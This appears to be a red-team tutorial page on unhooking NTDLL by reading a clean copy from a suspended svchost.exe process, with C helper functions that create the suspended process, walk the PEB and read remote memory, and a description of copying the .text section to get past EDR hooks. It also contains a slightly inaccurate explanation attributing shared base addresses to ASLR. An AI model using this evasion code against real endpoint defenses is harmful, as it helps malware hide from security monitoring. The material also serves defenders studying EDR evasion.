# NTDLL Unhooking - From Suspended Process

## Introduction

An alternate approach to loading NTDLL is to read it from a suspended process. This works because EDR's require a running process to to install their hooks. Here's how it works:

* We create a process in a suspended state. (Contains clean ntdll.dll)
* Get local base address of ntdll.dll. (Imported dlls share the same base address between processes)
* Get remote address of suspended process
* Access remote ntdll via the local base address (their the same between processes)
* Copy .text from remote to local using SizeOfCode found in local ntdll OptionalHeader

Do to ASLR, the virtual address of an imported library will be the same throughout all processes that import it. This is shared below:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>



## Example

The below screen shot is of svchost.exe (a suspended process we started). We are locating the NTDLL.dll based on the same address we fetched from the local PEB in unhooking.exe

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



### Required Helper Functions

The following functions are required to create a suspended file, get the base address of the created file,  and to get the address of the local ntdll.dll

```

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess) (
        HANDLE           ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID            ProcessInformation,
        ULONG            ProcessInformationLength,
        PULONG           ReturnLength
        );

BOOL CreateSuspendedProcess(STARTUPINFO *pSi, PPROCESS_INFORMATION pPi) {
    pSi->cb = sizeof(*pSi);
    // Just a POC: Update this with the dynamic filepath fetch for "svchost.exe"
    if (CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pSi, pPi) == 0) {
        wprintf(L"CreateProcessW Failed %d", GetLastError()) ;
        return FALSE;
    };
    return TRUE;
}

PVOID FetchRemoteBaseAddress(PPROCESS_INFORMATION pPi, PPROCESS_BASIC_INFORMATION pPbi) {

    fnNtQueryInformationProcess NtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQueryInformationProcess");
    // get target image PEB address and pointer to image base
    DWORD dwReturnLength = 0;
    LPVOID imageBase;
    NtQueryInformationProcess(pPi->hProcess, ProcessBasicInformation, pPbi, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
    DWORD_PTR pebOffset = (DWORD_PTR)pPbi->PebBaseAddress + 0x10;
    ReadProcessMemory(pPi->hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);
    return imageBase;
}

PVOID FetchLocalNtdllAddress() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

```
